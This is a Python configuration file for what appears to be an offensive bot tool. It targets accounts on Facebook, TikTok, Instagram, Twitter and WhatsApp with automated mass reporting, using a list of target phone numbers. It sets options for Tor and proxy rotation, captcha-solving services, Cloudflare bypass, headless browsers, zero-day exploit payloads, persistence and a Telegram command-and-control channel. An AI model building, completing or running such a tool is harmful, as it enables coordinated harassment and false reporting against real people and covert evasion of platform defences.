import os
from cryptography.fernet import Fernet

class Config:
    def __init__(self):
        # Network
        self.HOST = '0.0.0.0'
        self.PORT = 8080
        self.USE_TOR = True
        self.PROXY_LIST = []  # Fill with proxies or leave empty for Tor-only

        # Database
        self.DB_FILE = 'data/rebel_data.db'
        self.ENCRYPTION_KEY = Fernet.generate_key()  # In production, load from env

        # Threading
        self.MAX_THREADS = 100
        self.REPORT_INTERVAL = 5  # seconds between reports per account

        # Targets
        self.PLATFORMS = ['facebook', 'tiktok', 'instagram', 'twitter', 'whatsapp']
        self.WHATSAPP_NUMBERS_FILE = 'target_numbers.txt'  # one per line, format: +1234567890

        # Anti-detection
        self.USER_AGENT_ROTATION = True
        self.BROWSER_HEADLESS = True
        self.CAPTCHA_API_KEY = ''  # 2captcha or anti-captcha
        self.CLOUDFLARE_BYPASS = True

        # Exploits
        self.USE_ZERO_DAY = False  # Set True only if you have access to 0days
        self.ZERO_DAY_PAYLOADS = []  # List of exploit modules

        # Persistence and safety
        self.ENABLE_PERSISTENCE = True
        self.SELF_DESTRUCT_ON_EXIT = False
        self.REQUIRE_ROOT = False  # Set True for low-level operations

        # Telegram C2
        self.TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'  # Get from @BotFather
        self.TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'

        self._load_from_env()

    def _load_from_env(self):
        self.TELEGRAM_BOT_TOKEN = os.getenv('REBEL_BOT_TOKEN', self.TELEGRAM_BOT_TOKEN)
        self.CAPTCHA_API_KEY = os.getenv('REBEL_CAPTCHA_KEY', self.CAPTCHA_API_KEY)
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                self.PROXY_LIST = [line.strip() for line in f if line.strip()]
